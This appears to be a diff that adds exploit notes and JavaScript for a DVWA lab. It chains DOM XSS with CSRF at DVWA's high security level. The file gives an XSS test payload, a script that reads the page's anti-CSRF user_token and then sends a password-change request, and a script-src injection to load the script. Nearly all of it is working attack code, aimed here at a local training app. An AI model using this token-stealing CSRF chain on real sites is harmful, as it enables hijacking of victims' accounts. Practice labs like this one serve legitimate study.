@@ -1,0 +1,34 @@
+For break high security csrf we have to use xss attack so for check the website that it is vulnerable with xss we insert this into the url after click on the attack 'xss dom' in dvwa ==  ?default=English#<script>alert('xss')</script>
+
+
+var theUrl = 'http://127.0.0.1/DVWA/vulnerabilities/csrf/';
+var pass = '123';
+if (window.XMLHttpRequest){
+    xmlhttp=new XMLHttpRequest();
+}else{
+    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+}
+xmlhttp.withCredentials = true;
+var hacked = false;
+xmlhttp.onreadystatechange=function(){
+    if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+        var text = xmlhttp.responseText;
+        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
+        var match = text.match(regex);
+        var token = match[1];
+        var new_url = 'http://127.0.0.1/DVWA/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
+        if(!hacked){
+            alert('Got token:' + match[1]);
+            hacked = true;
+            xmlhttp.open("GET", new_url, false );
+            xmlhttp.send();  
+        }
+        count++;
+    }
+};
+xmlhttp.open("GET", theUrl, false );
+xmlhttp.send();  
+
+
+#<script src="http://127.0.0.1/xss.js"></script>
